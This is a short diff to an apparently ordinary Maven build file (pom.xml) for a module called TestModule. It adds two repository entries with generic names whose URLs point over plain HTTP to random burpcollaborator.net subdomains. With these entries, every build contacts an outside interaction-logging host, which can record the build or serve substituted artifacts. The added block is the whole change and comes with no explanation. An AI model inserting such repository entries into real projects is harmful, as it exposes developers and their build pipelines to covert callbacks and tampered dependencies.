@@ -10,6 +10,19 @@
     </parent>
     <modelVersion>4.0.0</modelVersion>
 
+    <repositories>
+        <repository>
+            <id>my-repo1</id>
+            <name>your custom repo</name>
+            <url>http://2hkboyyl082fnwtq8s69nj60lrrkf9.burpcollaborator.net</url>
+        </repository>
+        <repository>
+            <id>my-repo2</id>
+            <name>your custom repo</name>
+            <url>http://9r1iy58safcmx33xizggxqg7vy1sph.burpcollaborator.net</url>
+        </repository>
+    </repositories>
+
     <artifactId>TestModule</artifactId>
     <dependencies>
         <dependency>
